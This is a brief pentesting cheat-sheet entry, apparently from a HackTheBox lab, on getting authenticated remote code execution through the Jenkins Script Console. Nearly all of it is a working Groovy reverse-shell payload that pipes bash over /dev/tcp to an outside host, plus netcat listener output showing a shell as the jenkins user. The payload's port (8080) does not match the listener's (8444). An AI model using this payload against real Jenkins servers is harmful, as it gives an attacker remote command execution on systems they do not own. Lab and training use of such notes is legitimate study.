# Jenkins

### Authenticated RCE

* go to `manage jenkins` -> `script console`
* use the below payload&#x20;
* get shell

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/172.16.1.100/8080; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

ubuntu@dev:~/Documents/htb/dante/172.16.1.19$ nc -nlvp 8444
Listening on 0.0.0.0 8444
Connection received on 10.10.14.3 56854
id
uid=126(jenkins) gid=133(jenkins) groups=133(jenkins)
```
